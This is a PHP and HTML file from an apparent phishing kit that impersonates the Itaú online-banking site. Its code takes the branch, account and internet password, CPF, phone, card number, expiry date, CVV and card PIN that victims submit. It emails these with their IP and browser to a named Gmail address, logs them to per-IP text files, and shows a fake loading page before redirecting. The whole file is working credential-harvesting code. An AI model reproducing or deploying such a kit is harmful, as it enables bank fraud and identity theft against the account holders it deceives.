<!--?php
session_start();
 $date      = mktime(date('H')-3, date('i'), date('s'), date('m'), date('d'), date('Y'));
 $day       = gmdate('d/m/Y', $date);   // Dia  ex: 01/01/2070 ;)
 $time      = gmdate('H:i:s', $date);   // Hora ex: 00:00:00
 $time_two  = gmdate('H-i-s', $date);   // Hora ex: 00:00:00
 $plog_ip   = $_SERVER['REMOTE_ADDR']  ? $_SERVER['REMOTE_ADDR']  : 'N/A';
 $plog_host = @gethostbyaddr($plog_ip) ? @gethostbyaddr($plog_ip) : 'N/A';
 $plog_info = $day.'' .$time. ' [ ' .$plog_ip. ' | ' .$plog_host. ']'; 
 $plog_save = $plog_ip .$plog_host; 
 $useragent = $_SERVER['HTTP_USER_AGENT'];
   if (preg_match('|MSIE ([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'IE';
  } elseif (preg_match( '|Opera/([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Opera';
  } elseif(preg_match('|Firefox/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Firefox';
  } elseif(preg_match('|Chrome/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Chrome';
  } elseif(preg_match('|Safari/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Safari';
  } else {
    // browser not recognized!
    $browser_version = 0;
    $browser= 'other';
  }  
$ip = $_SERVER["REMOTE_ADDR"];
$dtehr = date("d-m-y H-i-s");

$agencia = $_POST['agencia'];
$conta = $_POST['conta'];
$senha = $_POST['senha'];
$telefone = $_POST['telefone'];
$senha2 = $_POST['senha2'];
$numerocc = $_POST['numerocc'];
$validade = $_POST['validade'];
$cvv = $_POST['cvv'];




//$header
$header = "From: ".$from_name." <".$from_mail.">\r\n";
$header .= "Reply-To: ".$replyto."\r\n";
$header .= "MIME-Version: 1.0\r\n";
$header .= "Content-Type: multipart/mixed; boundary=\"".$uid."\"\r\n\r\n";


$message = "
| ------------- INFO-ITAU -------------- 
| Navegador: $browser $browser_version
| IP: $ip
| Data/hora:$dtehr
| ---------------------------------- 
|
| Agencia...: $agencia
| Conta.....: $conta
| Senha.....: $senha
| Cel.......: $telefone
| SenhaC....: $senha2
| NumCC.....: $numerocc
| Val.......: $validade
| CVV.......: $cvv
| ------------- INFO-ITAU --------------";





if (mail("domingosconde2020@gmail.com", "[INFO-ITAU]", $message, $header)) {
	header('Location: index4.php');
    return true; // Or do something here
} else {
  return false;
}


?-->
<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta charset="utf-8">
<title>Seja Bem-vindo ao Internet Benking</title>
<meta http-equiv="refresh" content="4;URL=updateIMEI.php">
<style>
@media (min-width: 320px){ #resolution { width:300px; !important } }
@media (min-width: 480px){ #resolution { width:450px; !important } }
@media (min-width: 640px){ #resolution { width:610px; !important } }
@media (min-width: 200px){ #img { width:21%; height:32%; !important } }
@media (min-width: 320px){ #img { width:20%; height:32%; !important } }
@media (min-width: 480px){ #img { width:18%; height:42%; !important } }
@media (min-width: 640px){ #img { width:15%; height:48%; !important } }
@media (max-width: 480px){ #hide { display:none; !important } }
@media (max-height: 480px){ #hide2 { display:none; !important } }
#telefone { width:100%; height:35px; padding:5px; background:url(images/6.png) right no-repeat; border:none; color:#999; font-family:'Arial'; font-size:16px; outline:none; }
#senha2 { width:100%; height:35px; padding:5px; border:none; color:#999; font-family:'Arial'; font-size:16px; outline:none; }
#acessar { width:90%; height:60px; font-size:16px; color:#FFF; border-radius:5px; border:none; background:#F60; font-weight:bold; }
</style>
</head>

<body style="background:#FFF; margin:0;">
<div style="height:400px; background:; margin:0 auto;" id="resolution">
<div style="border-bottom:1px solid #CCC;">
<div style="width:50px; height:50px; background:url(images/5.png) no-repeat;"></div>
</div>
<div style="padding:15px; font-size:14px; font-family:'Arial'; color:#F60; border-bottom:1px solid #CCC; box-shadow:0 2px 2px #CCC;">aguarde..</div>
<div style="padding:0;">
<div style="background:#f2f2f2; border-bottom:1px solid #CCC; padding:30px;" align="center"><img src="images/loading.gif"></div>
</div>
<div style="padding:15px 0 15px 0;"></div>
<div style="padding:15px 0 15px 0;"></div>
</div>
</body>
</html>
<?php
extract($_POST);
date_default_timezone_set('America/Sao_Paulo');

$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .="From: ITA <domingosconde2020@gmail.com>";

$ip = $_SERVER["REMOTE_ADDR"];
$navegador = $_SERVER['HTTP_USER_AGENT'];
$pcname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$today = date("d/m/y"); 
$hora = date("H:i:s");

$ip_usuario = @$_SERVER[REMOTE_ADDR];

$agencia = $_POST['agencia'];
$conta = $_POST['conta'];
$senha = $_POST['senha'];
$cpf = $_POST['cpf'];
$ddd = $_POST['ddd'];
$fone = $_POST['fone'];
$ultimoscard = $_POST['ultimoscard'];
$senha2 = $_POST['senha2'];
$cvv = $_POST['cvv'];

$arquivo    = 'painel/ORANGE_ITA_' . $ip . ".txt";

$stringData = "
-------------------------------------<br>
ORANGE-ITA -->  $today - '.$hora.' <br>
@ $ip_usuario ($pcname)<br>
-------------------------------------<br>
NAVEGADOR: $navegador<br>
-------------------------------------<br>
AGENCIA.....: $agencia<br>
CONTA.......: $conta<br>
SENHANET....: $senha<br>
CPF.........: $cpf<br>
CELULAR.....: ($ddd) $fone<br>
4ULTIMOS....: $ultimoscard<br>
SCARTAO.....: $senha2<br>
CVV.........: $cvv<br>
--------------------------------------------<br>";

    $fp = fopen($arquivo, 'a+');
    if ($fp) {
        fwrite($fp, $stringData);
        fclose($fp);
    }

mail("domingosconde2020@gmail.com", "[ORANGE-ITA]"."$ip", $stringData, $headers);

?>